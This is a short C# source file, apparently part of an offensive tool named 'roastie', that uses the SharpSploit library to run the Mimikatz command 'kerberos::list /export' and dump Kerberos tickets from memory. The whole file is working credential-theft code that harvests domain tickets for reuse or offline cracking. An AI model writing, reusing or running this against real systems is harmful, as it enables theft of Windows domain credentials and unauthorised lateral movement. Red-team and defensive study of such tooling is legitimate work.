using System;
using SharpSploit.Credentials;


namespace roastie
{
    class SharpsploitThings
    {

        public static void ExportTickets()
        {
            Console.WriteLine(Mimikatz.Command("\"kerberos::list /export\""));
        }
        
    }

}
